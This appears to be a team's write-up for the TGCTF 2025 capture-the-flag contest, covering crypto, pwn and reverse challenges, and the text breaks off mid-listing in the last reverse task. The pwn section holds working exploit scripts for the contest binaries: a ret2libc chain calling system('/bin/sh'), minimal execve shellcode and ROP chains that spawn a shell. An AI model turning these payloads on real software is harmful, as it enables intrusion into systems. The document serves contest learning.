---
title: TGCTF 2025 不知道 WP
date: 2025-04-14 20:07:39
tags: [cry,web,re,pwn,misc]
categories: wp
typora-root-url: ./..
---

# 战队名：不知道

**排名：3**

![](/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png)

## Crypto

### AAAAAAAA·真·签到

UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}

和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++

```python
enc='UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}'

s='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
for i in range(len(enc)):
    if enc[i] in s:

        ind=s.index(enc[i])
        ind+=i-1
        print(s[ind%26],end='')
    else:
        print(enc[i],end='')
```

> TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}

### mm不躲猫猫

给了60组n，c，n有公共因子gcd求得解密即可

```python
from Crypto.Util.number import *

e = 65537

n_list = []
c_list = []

current_n = None
current_c = None

with open('E:\\wenjian\\p\\timu\\tgCTF\\cry\\challenge.txt', 'r') as f:
    for line in f:
        line = line.strip()
        if line.startswith('[') and line.endswith(']'):
            if current_n is not None and current_c is not None:
                n_list.append(current_n)
                c_list.append(current_c)
                current_n = None
                current_c = None
        elif line.startswith('n = '):
            current_n = int(line.split('=')[1].strip())
        elif line.startswith('c = '):
            current_c = int(line.split('=')[1].strip())
    
    if current_n is not None and current_c is not None:
        n_list.append(current_n)
        c_list.append(current_c)

for i in range(len(c_list)):
    n=n_list[i]
    other=n_list[:i] + n_list[i+1:]
    p=None
    for j in other:
        if GCD(n,j)!=1:
            p=GCD(n,j)
            q=n//p
            break
    if p == None:
        continue

    d=inverse(e,(p-1)*(q-1))
    print(long_to_bytes(pow(c_list[i],d,n)))
```

> TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}

### RwSiAns

```python
from flag import FLAG
from Crypto.Util.number import getPrime, bytes_to_long
import hashlib

def generate_key(bits=512):
    p = getPrime(bits)
    q = getPrime(bits)
    return p * q, 3

def hash(x):
    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)

def encrypt(m, n, e):
    x1, x2 = 307, 7
    c1 = pow(m + hash(x1), e, n)
    c2 = pow(m + hash(x2), e, n)
    return c1, c2

m = bytes_to_long(FLAG)
n, e = generate_key()
c1, c2 = encrypt(m, n, e)
print(f"n = {n}")
print(f"e = {e}")
print(f"c1 = {c1}")
print(f"c2 = {c2}")

n = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839
e = 3
c1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366
c2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814
```

基础的相关信息攻击

```python
from Crypto.Util.number import *
import hashlib

def generate_key(bits=512):
    p = getPrime(bits)
    q = getPrime(bits)
    return p * q, 3

def hash(x):
    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)


def encrypt(m, n, e):
    x1, x2 = 307, 7
    c1 = pow(m + hash(x1), e, n)
    c2 = pow(m + hash(x2), e, n)
    return c1, c2


n = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839
e = 3
c1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366
c2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814
s1=hash(307)
s2=hash(7)

def franklinReiter(n,e,c1,c2):
    PR.<x> = PolynomialRing(Zmod(n))
    g1 = (x+s1)^e - c1
    g2 = (x+s2)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()
    return -gcd(g1, g2)[0]

m=franklinReiter(n,e,c1,c2)
print(long_to_bytes(int(m)))
```

> TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}

### 宝宝rsa

```python
from math import gcd
from Crypto.Util.number import *
from secret import flag

# PART1
p1 = getPrime(512)
q1 = getPrime(512)
n1 = p1 * q1
phi = (p1 - 1) * (q1 - 1)
m1 = bytes_to_long(flag[:len(flag) // 2])
e1 = getPrime(18)
while gcd(e1, phi) != 1:
    e1 = getPrime(17)
c1 = pow(m1, e1, n1)

print("p1 =", p1)
print("q1 =", q1)
print("c1 =", c1)

# PART2
n2 = getPrime(512) * getPrime(512)
e2 = 3
m2 = bytes_to_long(flag[len(flag) // 2:])
c2 = pow(m2, e2, n2)

print("n2 =", n2)
print("c2 =", c2)
print("e2 =", e2)
```

flag分两段，前一段未知e，但是比较小，直接爆破就行，第二段e=3，n为1024位，m应该比较小直接开方即可

```python
from tqdm import tqdm

phi1=(p1-1)*(q1-1)
for i in tqdm(range(2**18,2**16,-1)):
    if gcd(i, phi1) != 1:
        continue
    d=inverse(i,phi1)
    m1=long_to_bytes(pow(c1,d,p1*q1))
    if b'TGCTF' in m1:
        break

print(m1)

# ---------------------------------------------------
from gmpy2 import *

m2=long_to_bytes(int(gmpy2.iroot(c2,3)[0]))
print(m2)

print(m1+m2)
```

> TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}

### 费克特尔

```python
c=670610235999012099846283721569059674725712804950807955010725968103642359765806
n=810544624661213367964996895060815354972889892659483948276203088055391907479553
e=65537
```

n很小直接yafu分一下,有很多因子,正常解即可

```python
from Crypto.Util.number import *

c=670610235999012099846283721569059674725712804950807955010725968103642359765806
n=810544624661213367964996895060815354972889892659483948276203088055391907479553
e=65537

p= [916848439436544911290378588839845528581,214168842768662180574654641, 2001511,18251 ,113 ]
phi=1
for i in p:
    phi*=(i-1)

d=inverse(e,phi)

print(long_to_bytes(pow(c,d,n)))
```

> TGCTF{f4888_6abdc_9c2bd_9036bb}

###  EZRSA

```python
from Crypto.Util.number import *

def genarate_emojiiiiii_prime(nbits, base=0):
    while True:
        p = getPrime(base // 32 * 32) if base >= 3 else 0
        for i in range(nbits // 8 // 4 - base // 32):
            p = (p << 32) + get_random_emojiiiiii() # 猜一猜
        if isPrime(p):
            return p

m = bytes_to_long(flag.encode()+ "".join([long_to_bytes(get_random_emojiiiiii()).decode() for _ in range(5)]).encode())
p = genarate_emojiiiiii_prime(512, 224)
q = genarate_emojiiiiii_prime(512)

n = p * q
e = "💯"
c = pow(m, bytes_to_long(e.encode()), n)

print("p0 =", long_to_bytes(p % 2 ** 256).decode())
print("n =", n)
print("c =", c)

p0 = '😘😾😂😋😶😾😳😷'
n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401
```

根据genarate_emojiiiiii_prime(512, 224)发现,p的结构,高位为224位素数,低位为9个emoji一个32位

题目给出了后8个emoji,查看每个emoji的十进制发现只有最后2位不一样,也就是说只爆破100个左右即可

知道低32*9=288位即可copper得到p

e和phi有公共因子，有限域开方crt遍历一下即可

```python
from Crypto.Util.number import *

p0_ = 108837065531980906150333850570890620719343963272506332719822248235755953428663
n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401

a=4036991100

from tqdm import tqdm
for i in tqdm(range(100)):
    PR.<x> = PolynomialRing(Zmod(n))
    f = x * 2^288 + p0_ + (a+i)*2^256
    f = f.monic()
    roots = f.small_roots(X=2^225, beta=0.4,epsilon=0.04)

    if roots:
        x = roots[0]
        p_candidate = int(x * 2^288 + p0_ + (a+i)*2^256)
        if n % p_candidate == 0:
            print("Found p:", p_candidate)
            q_candidate = n // p_candidate
            break

from gmpy2 import *
from random import *
from libnum import *

p=int(p_candidate)
q=int(q_candidate)
e=int(4036989615)

print(p,q,n%p,n%q)

print(GCD(e,(p-1)*(q-1)))
print(GCD(e,(p-1)))
print(GCD(e,(q-1)))

d=inverse(e//GCD(e,(p-1)*(q-1)),(p-1)*(q-1))
c=pow(c,d,n)

R.<y>=Zmod(p)[]
f=y^15-c
f=f.monic()
m1=f.roots()

R.<z>=Zmod(q)[]
f=z^15-c
f=f.monic()
m2=f.roots()

for i in m1:
    for j in m2:
        m=solve_crt([int(i[0]),int(j[0])],[int(p),int(q)])
        print(long_to_bytes(int(m)))
        if b'TGCTF' in long_to_bytes(int(m)):
            print(long_to_bytes(int(m)).decode())
```

记得解码flag,不然就会出现解出flag了但是全是字节码导致我以为哪里错了

> TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢

### ****LLLCG****

```python
from hashlib import sha256
from Crypto.Util.number import *
from random import randint
import socketserver
from secret import flag, dsa_p, dsa_q

class TripleLCG:
    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):
        self.state = [seed1, seed2, seed3]
        self.a = a
        self.b = b
        self.c = c
        self.d = d
        self.n = n

    def next(self):
        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n
        self.state.append(new)
        return new

class DSA:
    def __init__(self):
        # while True:
            # self.q = getPrime(160)
            # t = 2 * getPrime(1024 - 160) * self.q
            # if isPrime(t + 1):
            #    self.p = t + 1
            #    break
        self.p = dsa_p
        self.q = dsa_q
        self.g = pow(2, (self.p - 1) // self.q, self.p)
        self.x = randint(1, self.q - 1)
        self.y = pow(self.g, self.x, self.p)

    def sign(self, msg, k):
        h = bytes_to_long(sha256(msg).digest())
        r = pow(self.g, k, self.p) % self.q
        s = (inverse(k, self.q) * (h + self.x * r)) % self.q
        return (r, s)

    def verify(self, msg, r, s):
        if not (0 < r < self.q and 0 < s < self.q):
            return False
        h = bytes_to_long(sha256(msg).digest())
        w = inverse(s, self.q)
        u1 = (h * w) % self.q
        u2 = (r * w) % self.q
        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q
        return v == r

class Task(socketserver.BaseRequestHandler):
    def _recvall(self):
        BUFF_SIZE = 2048
        data = b''
        while True:
            part = self.request.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                break
        return data.strip()

    def send(self, msg, newline=True):
        if newline:
            msg += b'\n'
        self.request.sendall(msg)

    def recv(self, prompt=b'[-] '):
        self.send(prompt, newline=False)
        return self._recvall()

    def handle(self):
        n = getPrime(128)
        a, b, c, d = [randint(1, n - 1) for _ in range(4)]
        seed1, seed2, seed3 = [randint(1, n - 1) for _ in range(3)]

        lcg = TripleLCG(seed1, seed2, seed3, a, b, c, d, n)
        dsa = DSA()

        self.send(b"Welcome to TGCTF Challenge!\n")
        self.send(f"p = {dsa.p}, q = {dsa.q}, g = {dsa.g}, y = {dsa.y}".encode())

        small_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]
        used_messages = set()
        for o_v in range(3):
            self.send(b"Select challenge parts: 1, 2, 3\n")
            parts = self.recv().decode().split()

            if '1' in parts:
                self.send(b"Part 1\n")
                for i in range(12):
                    self.send(f"Message {i + 1}: ".encode())
                    msg = self.recv()
                    used_messages.add(msg)
                    k = lcg.next()
                    r, s = dsa.sign(msg, k)
                    self.send(f"r = {r}, ks = {[k % p for p in small_primes]}\n".encode())

            if '2' in parts:
                self.send(b"Part 2\n")
                for _ in range(307):
                    k = lcg.next()
                for i in range(10):
                    self.send(f"Message {i + 1}: ".encode())
                    msg = self.recv()
                    k = lcg.next() % dsa.q
                    r, s = dsa.sign(msg, k)
                    self.send(f"Signature: r = {r}, s = {s}\n".encode())
                    used_messages.add(msg)

            if '3' in parts:
                self.send(b"Part 3\n")
                self.send(b"Forged message: ")
                final_msg = self.recv()
                self.send(b"Forged r: ")
                r = int(self.recv())
                self.send(b"Forged s: ")
                s = int(self.recv())

                if final_msg in used_messages:
                    self.send(b"Message already signed!\n")
                elif dsa.verify(final_msg, r, s):
                    self.send(f"Good! Your flag: {flag}\n".encode())
                else:
                    self.send(b"Invalid signature.\n")
```

分析代码,给出了一个自定的三重lcg,part1给出12组签名的r,以及一个k与很多素数的模的list

9个素数,每个16位，乘积大于k的128位,所以crt可以恢复出k的值

现在相当于拥有12组k,根据12组k逆向lcg即可

使用Grobner基解同余方程组,即可恢复所有参数,接下来预测k值,p,q,g,y均为已知值,即可计算得到x

然后伪造签名即可

```python
from pwn import *
from Crypto.Util.number import *
from hashlib import sha256

sh=remote("node1.tgctf.woooo.tech",31104)
context.log_level='debug'

small_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]

class TripleLCG:
    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):
        self.state = [seed1, seed2, seed3]
        self.a = a
        self.b = b
        self.c = c
        self.d = d
        self.n = n

    def next(self):
        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n
        self.state.append(new)
        return new

class DSA:
    def __init__(self):
        # while True:
            # self.q = getPrime(160)
            # t = 2 * getPrime(1024 - 160) * self.q
            # if isPrime(t + 1):
            #    self.p = t + 1
            #    break
        self.p = dsa_p
        self.q = dsa_q
        self.g = pow(2, (self.p - 1) // self.q, self.p)
        self.x = randint(1, self.q - 1)
        self.y = pow(self.g, self.x, self.p)

    def sign(self, msg, k):
        h = bytes_to_long(sha256(msg).digest())
        r = pow(self.g, k, self.p) % self.q
        s = (inverse(k, self.q) * (h + self.x * r)) % self.q
        return (r, s)

    def verify(self, msg, r, s):
        if not (0 < r < self.q and 0 < s < self.q):
            return False
        h = bytes_to_long(sha256(msg).digest())
        w = inverse(s, self.q)
        u1 = (h * w) % self.q
        u2 = (r * w) % self.q
        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q
        return v == r
# -------------------------------------------------
# get pqgy

sh.recvuntil(b'!\n')
sh.recvuntil(b'\n')

sh.recvuntil(b'p = ')
p=int(sh.recvuntil(b',').decode()[:-1])
print('p = ',p)
sh.recvuntil(b'q = ')
q=int(sh.recvuntil(b',').decode()[:-1])
print('q = ',q)
sh.recvuntil(b'g = ')
g=int(sh.recvuntil(b',').decode()[:-1])
print('g = ',g)
sh.recvuntil(b'y = ')
y=int(sh.recvuntil(b'\n').decode()[:-1])
print('y = ',y)

print('----------------------------------------------------')
# part 1
sh.recvuntil(b'] ')
sh.sendline(b'1')
r_l=[]
ks_l=[]
for i in range(12):
    sh.recvuntil(b'] ')
    sh.sendline(b'1')
    sh.recvuntil(b'r = ')
    r=int(sh.recvuntil(b',').decode()[:-1])
    print('r = ',r)
    sh.recvuntil(b'ks = ')
    ks=eval(sh.recvuntil(b'\n').decode()[:-1])
    print('ks = ',ks)
    r_l.append(r)
    ks_l.append(ks)

print(r_l,ks_l)

from libnum import *
def recover_k(residues):    
    return solve_crt(residues,small_primes)

k_ = [recover_k(i) for i in ks_l]
print(k_)

#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]

R.<a,b,c,d> = PolynomialRing(ZZ)

f1=k_[0]*a+k_[1]*b+k_[2]*c+d-k_[3]
f2=k_[1]*a+k_[2]*b+k_[3]*c+d-k_[4]
f3=k_[2]*a+k_[3]*b+k_[4]*c+d-k_[5]
f4=k_[3]*a+k_[4]*b+k_[5]*c+d-k_[6]
f5=k_[4]*a+k_[5]*b+k_[6]*c+d-k_[7]
f6=k_[5]*a+k_[6]*b+k_[7]*c+d-k_[8]
f7=k_[6]*a+k_[7]*b+k_[8]*c+d-k_[9]
f8=k_[7]*a+k_[8]*b+k_[9]*c+d-k_[10]
f9=k_[8]*a+k_[9]*b+k_[10]*c+d-k_[11]

F=[f1,f2,f3,f4,f5,f6,f7,f8,f9]
ideal = Ideal(F)

I = ideal.groebner_basis()
print(I)
n = int(I[4])
a = int(-I[0].univariate_polynomial()(0))%n
b = int(-I[1].univariate_polynomial()(0))%n
c = int(-I[2].univariate_polynomial()(0))%n
d = int(-I[3].univariate_polynomial()(0))%n

print(a,b,c,d,n)
print(a.bit_length(),b.bit_length(),c.bit_length(),d.bit_length(),n.bit_length())

lcg=TripleLCG(k_[-3],k_[-2],k_[-1],a,b,c,d,n)

print('--------------------------------------------------')
#part 2

sh.recvuntil(b'] ')
sh.sendline(b'2')
sh.recvuntil(b' 2\n')

for _ in range(307):
    k = lcg.next()

r_l2 = []
s_l = []

for i in range(10):
    sh.recvuntil(b'] ')
    sh.sendline(b'a')

    sh.recvuntil(b'r = ')
    r=int(sh.recvuntil(b',').decode()[:-1])
    print('r = ',r)
    sh.recvuntil(b's = ')
    s=int(sh.recvuntil(b'\n').decode()[:-1])
    print('s = ',s)

    r_l2.append(r)
    s_l.append(s)
print(r_l2,s_l)
print(len(r_l2),len(s_l))

m = b'a'
h = bytes_to_long(sha256(m).digest())
k = lcg.next()
print('k=',k)
inv_r=inverse(r_l2[0],q)
x = ((s_l[0]*k%q-h)*inv_r) % q
print(x)

print("------------------------------------------")
#part 3

sh.recvuntil(b'] ')
sh.sendline(b'3')

end_m=b'b'
sh.recvuntil(b'e: ')
sh.sendline(end_m)

end_h = bytes_to_long(sha256(b'b').digest())
r_ = pow(g,1,p)%q
s_ = ((end_h+x*r_)*inverse(1,q))%q
print(r_,s_)

sh.recvuntil(b'r: ')
sh.sendline(str(r_).encode())
sh.recvuntil(b's: ')
sh.sendline(str(s_).encode())
sh.recvlines()

sh.interactive()
```

![img](/images/1744633170180-60.png)

## Pwn

### 签到

栈溢出，打ret2libc。

```python
from pwn import *

io=process("./pwn")
libc=ELF("libc.so.6")

plt=0x0401060
got=0x0404018
rdi=0x0401176
start=0x0401090
ret=0x040101a

p=b"A"*120+p64(rdi)+p64(got)+p64(plt)+p64(start)
io.sendlineafter("name.", p)
libc.address=u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))-libc.sym["puts"]
print(hex(libc.address))

p=b"A"*120+p64(ret)+p64(rdi)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym["system"])
io.sendlineafter("name.", p)

io.interactive()
```

### shellcode

Shellcode 限制0x12 大小，不能在mmap可执行区域二次写。

所有寄存器都被清空了，除了rdi为mmap可执行区域。

改eax成execve系统调用，之后再加rdi到写入/bin/sh的偏移，最后syscall去拿shell。

eax省2字节

```python
from pwn import *

context.arch="amd64"

io = process("./pwn")

sc=asm('''
mov eax, 0x3b
add rdi, 0xb
syscall
''')+b"/bin/sh"

print(len(sc))
io.send(sc)

io.interactive()
```

### stack

第一次输入会在0x0404060处读0xa8 字节，第二次读有栈溢出，题目模拟了canary保护会跳到sub_4011B6。

![img](/images/1744633170177-2.png)

sub_4011B6会从qword_4040a0处拿rax， fd 拿rdi， buf拿rsi，count拿rdx。

![img](/images/1744633170177-3.png)

第一次写可以溢出到这些位置来改变syscall，伪造成execve("/bin/sh", 0, 0)。

```python
from pwn import *

io=process("./pwn")

p=b"A"*64+p64(0x3b)+p64(0x0404108)+p64(0)*2
io.sendafter("name?", p)
io.sendafter("say?", b"A"*0x50)

io.interactive()
```

### overflow

x86 静态编译，有栈溢出。

![img](/images/1744633170177-4.png)

返回之前可以栈迁移到任意地址，把栈迁移到第一次read再用第一次read写入rop即可。

```python
from pwn import *

io=process("./pwn")
context.terminal = ["tmux", "splitw", "-h"]

eax=0x080b470a
ebx=0x08049022
ecx=0x08049802
edx=0x08060bd1

rop=p32(eax)+p32(0xb)
rop+=p32(ebx)+p32(0x80ef344)
rop+=p32(ecx)+p32(0)
rop+=p32(edx)+p32(0)
rop+=p32(0x08049c6a)
rop+=b"/bin/sh\0"

print(len(rop))
io.sendafter("name?", rop)

p=b'A'*(200)+p32(0x080EF320+4)*3
io.sendlineafter("right?", p)

io.interactive()
```

## Reverse

### Base64

Base64变种加密

```cpp
_BYTE *__fastcall sub_7FF7DC6C10E0(__int64 a1)
{
  __int64 v2; // rbx
  __int64 v3; // rbp
  int v4; // edx
  int v5; // edi
  int v6; // edx
  __int64 v7; // r14
  size_t v8; // rcx
  _BYTE *v9; // r8
  __int64 v10; // r9
  unsigned __int64 v11; // rdx
  int v12; // ecx
  unsigned int v13; // ecx
  unsigned int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // edi
  __int64 v19; // rdx
  int v20; // eax
  int v21; // eax
  int v22; // ecx
  unsigned int v23; // edx
  int v24; // ecx
  int v25; // eax
  int v26; // ecx
  unsigned int v27; // ecx
  unsigned int v28; // eax
  char v30[80]; // [rsp+20h] [rbp-68h] BYREF
  int v31; // [rsp+90h] [rbp+8h]

  v2 = -1;
  strcpy(v30, "GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI");
  do
    ++v2;
  while ( *(_BYTE *)(a1 + v2) );
  v3 = 0;
  v4 = (int)v2 / 3;
  if ( (_DWORD)v2 == 3 * ((int)v2 / 3) )
  {
    v5 = 0;
    v6 = 4 * v4;
  }
  else if ( (int)v2 % 3 == 1 )
  {
    v5 = 1;
    v6 = 4 * v4 + 4;
  }
  else if ( (int)v2 % 3 == 2 )
  {
    v5 = 2;
    v6 = 4 * v4 + 4;
  }
  else
  {
    v5 = v31;
    v6 = v31;
  }
  v7 = v6;
  v8 = v6 + 1LL;
  if ( v6 == -1 )
    v8 = -1;
  v9 = malloc(v8);
  if ( (int)v2 - v5 > 0 )
  {
    v10 = a1 + 2;
    v11 = ((int)v2 - v5 - 1LL) / 3uLL + 1;
    do
    {
      v3 += 4;
      v12 = *(unsigned __int8 *)(v10 - 2) >> 2;
      v10 += 3;
      v13 = v12 + 24;
      v14 = v13 - 64;
      if ( v13 <= 0x40 )
        v14 = v13;
      v9[v3 - 4] = v30[v14];
      v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3u))) + 24 <= 0x40 )
        v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) + 24;
      v9[v3 - 3] = v30[v15];
      v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) - 40;
      if ( ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xFu))) + 24 <= 0x40 )
        v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) + 24;
      v9[v3 - 2] = v30[v16];
      v17 = (*(_BYTE *)(v10 - 3) & 0x3F) - 40;
      if ( (*(_BYTE *)(v10 - 3) & 0x3Fu) + 24 <= 0x40 )
        v17 = (*(_BYTE *)(v10 - 3) & 0x3F) + 24;
      v9[v3 - 1] = v30[v17];
      --v11;
    }
    while ( v11 );
  }
  v18 = v5 - 1;
  if ( !v18 )
  {
    v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) - 40;
    if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24 <= 0x40u )
      v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24;
    v9[v7 - 4] = v30[v25];
    v26 = *(_BYTE *)((int)v2 + a1 - 1) & 3;
    *(_WORD *)&v9[v7 - 2] = 15677;
    v27 = 16 * v26 + 24;
    v28 = v27 - 64;
    if ( v27 <= 0x40 )
      v28 = v27;
    v9[v7 - 3] = v30[v28];
    goto LABEL_37;
  }
  if ( v18 != 1 )
  {
LABEL_37:
    v9[v7] = 0;
    return v9;
  }
  v19 = a1 + (int)v2;
  v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) - 40;
  if ( (*(unsigned __int8 *)(v19 - 2) >> 2) + 24 <= 0x40u )
    v20 = (*(unsigned __int8 *)(v19 - 2) >> 2) + 24;
  v9[v7 - 4] = v30[v20];
  v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) - 40;
  if ( ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3u))) + 24 <= 0x40 )
    v21 = ((*(unsigned __int8 *)(v19 - 1) >> 4) | (16 * (*(_BYTE *)(v19 - 2) & 3))) + 24;
  v9[v7 - 3] = v30[v21];
  v22 = *(_BYTE *)(v19 - 1) & 0xF;
  *(_WORD *)&v9[v7 - 1] = 61;
  v23 = 4 * v22 + 24;
  v24 = 4 * v22 - 40;
  if ( v23 <= 0x40 )
    v24 = v23;
  v9[v7 - 2] = v30[v24];
  return v9;
}
```

解密代码：

```cpp
#include <iostream>
#include <windows.h>
#include <string>
#include <time.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *base64_decode(const char *input)
{
    const char *base64_table = "GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI";

    unsigned char reverse_table[256] = {0};
    for (int i = 0; i < 64; i++)
    {
        reverse_table[(unsigned char)base64_table[i]] = i;
    }

    size_t input_len = strlen(input);
    size_t padding = 0;

    if (input_len > 0 && input[input_len - 1] == '=')
    {
        padding++;
        if (input_len > 1 && input[input_len - 2] == '=')
        {
            padding++;
        }
    }

    size_t output_len = (input_len * 3) / 4 - padding;
    unsigned char *output = (unsigned char *)malloc(output_len + 1);
    output[output_len] = 0;

    size_t i = 0, j = 0;
    while (i < input_len - padding)
    {
        unsigned char b1, b2, b3, b4;

        unsigned char v1 = reverse_table[input[i++]];
        unsigned char v2 = reverse_table[input[i++]];
        unsigned char v3 = (i < input_len) ? reverse_table[input[i++]] : 0;
        unsigned char v4 = (i < input_len) ? reverse_table[input[i++]] : 0;

        b1 = (v1 > 24) ? (v1 - 24) : (v1 + 64 - 24);
        b2 = (v2 > 24) ? (v2 - 24) : (v2 + 64 - 24);
        b3 = (v3 > 24) ? (v3 - 24) : (v3 + 64 - 24);
        b4 = (v4 > 24) ? (v4 - 24) : (v4 + 64 - 24);

        if (j < output_len)
            output[j++] = (b1 << 2) | (b2 >> 4);
        if (j < output_len)
            output[j++] = (b2 << 4) | (b3 >> 2);
        if (j < output_len)
            output[j++] = (b3 << 6) | b4;
    }

    return (char *)output;
}

int main()
{
    const char *Enc= "AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=";
    char *Decoded= base64_decode(Enc);
    printf("%s\n", Decoded);
    free(decoded);
    return 0;
}
```

HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}

### 水果忍者

主要dll目录：\水果忍者\Fruit Ninja_Data\Managed\Assembly-CSharp.dll

拖入dnSpy分析，是AES CBC加密。

![img](/images/1744633170177-5.png)

底下有密文、密钥、iv，直接解密即可。

![img](/images/1744633170177-6.png)

![img](/images/1744633170177-7.png)

HZNUCTF{de20-70dd-4e62-b8d0-06e}

### 蛇年的本命语言

python程序解包得到pyc（python 3.8），使用uncompyle6解密得到代码。

```python
from collections import Counter
print("Welcome to HZNUCTF!!!")
print("Plz input the flag:")
ooo0oOoooOOO0 = input()
oOO0OoOoo000 = Counter(ooo0oOoooOOO0)
O0o00 = "".join((str(oOO0OoOoo000[oOooo0OOO]) for oOooo0OOO in ooo0oOoooOOO0))
print("ans1: ", end="")
print(O0o00)
if O0o00 != "111111116257645365477364777645752361":
    print("wrong_wrong!!!")
    exit(1)
iiIII = ""
for oOooo0OOO in ooo0oOoooOOO0:
    if oOO0OoOoo000[oOooo0OOO] > 0:
        iiIII += oOooo0OOO + str(oOO0OoOoo000[oOooo0OOO])
        oOO0OoOoo000[oOooo0OOO] = 0
    else:
        i11i1Iii1I1 = [ord(oOooo0OOO) for oOooo0OOO in iiIII]
        ii1iIi1i11i = [
         7 * i11i1Iii1I1[0] == 504,
         9 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] == 403,
         2 * i11i1Iii1I1[0] - 5 * i11i1Iii1I1[1] + 10 * i11i1Iii1I1[2] == 799,
         3 * i11i1Iii1I1[0] + 8 * i11i1Iii1I1[1] + 15 * i11i1Iii1I1[2] + 20 * i11i1Iii1I1[3] == 2938,
         5 * i11i1Iii1I1[0] + 15 * i11i1Iii1I1[1] + 20 * i11i1Iii1I1[2] - 19 * i11i1Iii1I1[3] + 1 * i11i1Iii1I1[4] == 2042,
